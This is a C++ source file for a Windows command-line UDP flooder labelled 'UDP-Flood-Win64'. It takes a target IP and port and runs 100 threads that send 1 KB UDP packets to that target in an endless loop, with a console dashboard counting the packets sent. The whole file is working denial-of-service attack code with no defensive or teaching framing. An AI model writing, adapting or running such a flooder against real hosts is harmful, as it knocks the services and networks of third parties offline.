#include "udp_flood.hpp"

#define BUFFER_SIZE 1024

/*
    BUFFER_SIZE Reference

    64      -> 64 bytes
    128     -> 128 bytes
    256     -> 256 bytes
    512     -> 512 bytes (0.5 KB)
    1024    -> 1 KB
    2048    -> 2 KB
    4096    -> 4 KB
    8192    -> 8 KB
    16384   -> 16 KB
    32768   -> 32 KB
    65507   -> Maximum theoretical UDP payload (IPv4)
*/

#define MAX_THREADS 100

void UDP_flood(SOCKET sock, const std::string& target_ip, int target_port)
{
    while (loop)
    {
        sockaddr_in target{};
        target.sin_family = AF_INET;
        target.sin_port = htons(target_port);
        target.sin_addr.s_addr = inet_addr(target_ip.c_str());

        char buffer[BUFFER_SIZE] = {};

        sendto(
            sock,
            buffer,
            sizeof(buffer),
            0,
            (sockaddr*)&target,
            sizeof(target)
        );
        nb_send++;
    }
    return ;
}

void displayDashboard(const std::string& target_ip, int target_port)
{
    system("cls");

    constexpr int WIDTH = 43;

    auto line = []()
    {
        std::cout << "+" << std::string(WIDTH, '-') << "+\n";
    };

    auto row = [](const std::string& text)
    {
        std::cout << "| "
                  << std::left << std::setw(WIDTH - 1)
                  << text
                  << "|\n";
    };

    line();
    row("UDP-Flood-Win64");
    line();

    row("Target       : " + target_ip);
    row("Port         : " + std::to_string(target_port));
    row("Threads      : " + std::to_string(MAX_THREADS));
    row("Payload Size : " + std::to_string(BUFFER_SIZE) + " bytes");
    line();
    row("Packets Sent : " + std::to_string(nb_send));

    line();

    row("Press Q to quit");

    line();
}

int main(int argc, char* argv[])
{
    loop = true;

    if (argc < 3)
    {
        std::cout << "Usage: " << argv[0] << " <target_ip> <target_port>" << std::endl;
        return (1);
    }

    WSADATA wsa;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (sock == INVALID_SOCKET)
    {
        std::cerr << "socket() failed\n";
        WSACleanup();
        return 1;
    }

    std::vector<std::thread> threads;

    for (int i = 0; i < MAX_THREADS; ++i)
    {
        threads.emplace_back(UDP_flood, sock, std::string(argv[1]), std::stoi(argv[2]));
    }

    while (loop)
    {
        displayDashboard(std::string(argv[1]), std::stoi(argv[2]));
        Sleep(200);
    }

    for (auto& t : threads)
    {
        t.join();
    }
    closesocket(sock);
    return (0);
}